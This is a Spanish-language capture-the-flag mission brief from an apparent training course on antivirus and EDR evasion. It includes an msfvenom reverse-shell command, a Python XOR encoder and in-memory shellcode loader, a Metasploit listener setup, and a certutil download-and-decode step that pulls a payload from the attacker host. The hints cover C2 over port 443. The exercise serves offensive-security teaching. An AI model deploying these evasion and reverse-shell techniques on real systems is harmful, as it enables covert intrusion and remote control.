# 🟠 Infiltración Fantasma — 0xVK-002

```
CÓDIGO      : 0xVK-002
DIFICULTAD  : ████████░░ DIFÍCIL
XP BASE     : 300 pts
FACULTAD    : 03 — Pentesting & Red Team
PRERREQUISITO: 0xVK-001 completado, conocimiento básico de Python/Bash
```

---

## 📡 Briefing

> *La empresa objetivo ha reforzado su perímetro tras el incidente anterior. Tienen un antivirus corporativo actualizado, un firewall con inspección de paquetes y un EDR básico activo. Tu misión: alojar un agente de acceso remoto en el sistema objetivo sin disparar ninguna alerta. La invisibilidad es el objetivo.*

**Objetivo final (FLAG):** Establecer conexión de control remoto al servidor simulado sin activar el motor antivirus ni el IDS configurado. La flag aparece en el endpoint de confirmación C2.

---

## 🎯 Objetivos de aprendizaje

Al completar esta operación, el operador será capaz de:

- [ ] Entender cómo funcionan las firmas de antivirus (static + behavioral)
- [ ] Generar payloads básicos con `msfvenom`
- [ ] Aplicar técnicas de ofuscación y encoding manual
- [ ] Usar técnicas Living-Off-The-Land (LOL binaries)
- [ ] Entender qué dispara alertas en un EDR y qué no
- [ ] Documentar un proceso completo de evasión con razonamiento técnico

---

## 🗺️ Fases de la operación

### FASE 1 — Reconocimiento del perímetro defensivo

**Objetivo:** Mapear las defensas activas antes de cualquier intento de infiltración.

**Tareas:**
1. Identifica el AV activo y su versión
2. Detecta puertos/protocolos permitidos a través del firewall
3. Identifica LOL binaries disponibles en el sistema objetivo:
   ```bash
   # En Windows
   where powershell
   where certutil
   where bitsadmin
   where mshta
   where regsvr32
   ```
4. Detecta qué extensiones de archivo son bloqueadas

**Checkpoint 1:** ¿Qué puertos están abiertos hacia el exterior? ¿Qué proceso de AV está corriendo?

---

### FASE 2 — Generación y ofuscación del payload

**Objetivo:** Crear un agente que evada la detección estática.

**Concepto clave — Detección estática vs comportamental:**
```
ESTÁTICA  → El AV compara bytes del archivo con una base de firmas conocidas.
            Evasión: cambiar el binario suficientemente (encoding, encryption, packers).

COMPORTAMENTAL → El EDR observa qué hace el proceso en runtime.
            Evasión: evitar APIs sospechosas, usar LOL binaries, fragmentar acciones.
```

**Tareas:**
1. Genera un payload base con `msfvenom`:
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp \
     LHOST=<TU_IP> LPORT=4444 \
     -f exe -o payload_raw.exe
   ```
2. Observa su tasa de detección en el entorno simulado
3. Aplica encoding XOR manual sobre el shellcode:
   ```python
   # Ejemplo de encoder XOR básico
   key = 0x41
   encoded = bytes([b ^ key for b in shellcode])
   ```
4. Genera un loader en Python que decifre y ejecute en memoria:
   ```python
   import ctypes
   
   def decode_shellcode(encoded, key):
       return bytes([b ^ key for b in encoded])
   
   shellcode = decode_shellcode(encoded_payload, 0x41)
   buf = ctypes.create_string_buffer(shellcode)
   func = ctypes.cast(buf, ctypes.CFUNCTYPE(None))
   func()
   ```

**Checkpoint 2:** ¿Cuántas firmas detectaron tu payload original vs el ofuscado?

---

### FASE 3 — Infiltración y establecimiento del canal C2

**Objetivo:** Alojar el agente y establecer comunicación de control remoto sin alertas.

**Tareas:**
1. Configura el listener en Metasploit:
   ```bash
   use exploit/multi/handler
   set payload windows/x64/meterpreter/reverse_tcp
   set LHOST <TU_IP>
   set LPORT 4444
   run -j
   ```
2. Transfiere el payload usando LOL binary (sin subir ejecutables directamente):
   ```powershell
   # Usando certutil (Windows LOL binary)
   certutil -urlcache -split -f http://<TU_IP>/payload.b64 payload.b64
   certutil -decode payload.b64 payload.exe
   ```
3. Verifica que la conexión se establece sin alertas activas
4. Captura la flag desde el endpoint C2

**Checkpoint 3:** ¿El IDS generó algún log de alerta? ¿Por qué sí o por qué no?

---

## 🚩 Entrega de la FLAG

Formato esperado:
```
0xVKRAD{c2_established_<token_unico>}
```

---

## 💡 Hints disponibles (costo: -15 XP cada uno)

<details>
<summary>Hint 1 — Canal de comunicación</summary>

El firewall bloquea conexiones salientes en puertos no estándar. Usa el puerto 443 (HTTPS) para tu canal C2. El tráfico cifrado pasa sin inspección en la configuración simulada.
</details>

<details>
<summary>Hint 2 — Evasión de detección estática</summary>

El AV simulado usa detección por firmas de strings conocidos de Metasploit. Ofuscar el payload con XOR key 0x4D reduce las detecciones al mínimo en este entorno.
</details>

<details>
<summary>Hint 3 — LOL binary recomendado</summary>

`certutil` está disponible en el objetivo y no está bloqueado. Puedes usarlo para descargar y decodificar tu payload desde base64 sin tocar el disco con un ejecutable directamente.
</details>

---

## 🏅 Puntuación

| Logro | XP |
|---|---|
| Completar la misión | 300 |
| Primera resolución del día | +20 |
| Sin usar hints | +30 |
| Sin disparar ninguna alerta | +60 |
| Writeup aprobado | +50 |
| **Total máximo** | **460** |

---

## 🔬 Lección técnica

> Los AV modernos combinan detección estática (firmas), heurística (patrones de comportamiento) y ML sobre telemetría. La evasión real no es solo cambiar bytes: es entender qué comportamientos son considerados maliciosos y ejecutar las mismas acciones de forma que parezcan legítimas (LOL binaries, process injection, HTTPS C2).

---

*Operación clasificada. Entorno controlado y simulado. Uso exclusivo educativo.*
